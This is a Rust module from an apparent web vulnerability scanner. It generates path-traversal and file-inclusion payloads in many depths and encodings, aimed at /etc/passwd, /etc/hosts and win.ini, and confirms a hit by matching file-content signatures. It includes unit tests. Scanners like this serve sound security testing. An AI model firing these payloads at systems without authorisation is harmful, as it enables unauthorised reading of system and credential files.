//! Path traversal / Local File Inclusion (CWE-22 / CWE-98) detection.
//!
//! Evidence-driven: traversal sequences targeting well-known files are injected,
//! and a hit is confirmed only when the response contains that file's *content
//! signature* (e.g. `root:x:0:0:` from `/etc/passwd`). The signature appears
//! only if the file was actually read, so reflection of the payload alone cannot
//! produce a false positive. Multiple traversal depths and encodings are tried.

use crate::sqli::request::Request;
use anyhow::Result;
use lazy_static::lazy_static;
use regex::Regex;

/// A confirmed path-traversal vector.
#[derive(Debug, Clone)]
pub struct PathTravVector {
    pub payload: String,
    pub file: &'static str,
}

struct Target {
    file: &'static str,
    windows: bool,
    signature: &'static str,
}

const TARGETS: &[Target] = &[
    Target { file: "etc/passwd", windows: false, signature: r"root:[^:]*:0:0:" },
    Target {
        file: "etc/hosts",
        windows: false,
        signature: r"(?i)127\.0\.0\.1\s+localhost",
    },
    Target {
        file: "windows/win.ini",
        windows: true,
        signature: r"(?i)\[(fonts|extensions|mci extensions)\]|for 16-bit app support",
    },
];

lazy_static! {
    static ref SIGS: Vec<Regex> = TARGETS
        .iter()
        .map(|t| Regex::new(t.signature).unwrap())
        .collect();
}

/// Generate traversal payloads for a target file across depths and encodings.
fn payloads(file: &str, windows: bool) -> Vec<String> {
    let mut out = Vec::new();
    // Absolute path (no traversal needed if the param is used as a raw path).
    if windows {
        out.push("c:\\windows\\win.ini".to_string());
        out.push("c:/windows/win.ini".to_string());
    } else {
        out.push(format!("/{file}"));
    }

    for depth in [3usize, 5, 7, 8, 10] {
        if windows {
            let up = "..\\".repeat(depth);
            out.push(format!("{up}{}", file.replace('/', "\\")));
            out.push(format!("{}{}", "....\\\\".repeat(depth), file.replace('/', "\\")));
            out.push(format!("{}{}", "..%5c".repeat(depth), file.replace('/', "%5c")));
        } else {
            let up = "../".repeat(depth);
            out.push(format!("{up}{file}")); // ../../../etc/passwd
            out.push(format!("{up}{file}\u{0}")); // null-byte truncation
            out.push(format!("{}{file}", "....//".repeat(depth))); // ....// bypass
            out.push(format!("{}{}", "..%2f".repeat(depth), file.replace('/', "%2f"))); // url-enc slash
            out.push(format!("{}{}", "%2e%2e%2f".repeat(depth), file.replace('/', "%2f"))); // url-enc dots
            out.push(format!("{}{}", "..%252f".repeat(depth), file.replace('/', "%252f"))); // double-enc
        }
    }
    out
}

/// Check a parameter for path traversal / LFI.
pub async fn check_path_traversal(request: &Request<'_>) -> Result<Option<PathTravVector>> {
    for (i, target) in TARGETS.iter().enumerate() {
        let sig = &SIGS[i];
        for payload in payloads(target.file, target.windows) {
            let page = request.query_page(&payload).await?;
            if sig.is_match(&page) {
                return Ok(Some(PathTravVector {
                    payload,
                    file: target.file,
                }));
            }
        }
    }
    Ok(None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn signatures_match_real_file_content() {
        assert!(SIGS[0].is_match("root:x:0:0:root:/root:/bin/bash"));
        assert!(SIGS[1].is_match("127.0.0.1   localhost"));
        assert!(SIGS[2].is_match("; for 16-bit app support\n[fonts]"));
    }

    #[test]
    fn signatures_do_not_match_a_reflected_payload() {
        // A reflected traversal payload (no file read) must not match.
        for sig in SIGS.iter() {
            assert!(!sig.is_match("you requested ../../../../etc/passwd (not found)"));
        }
    }

    #[test]
    fn payloads_cover_encodings_and_depths() {
        let p = payloads("etc/passwd", false);
        assert!(p.iter().any(|x| x.contains("../../../etc/passwd")));
        assert!(p.iter().any(|x| x.contains("%2e%2e%2f")));
        assert!(p.iter().any(|x| x.contains("..%252f")));
        assert!(p.iter().any(|x| x == "/etc/passwd"));
    }
}
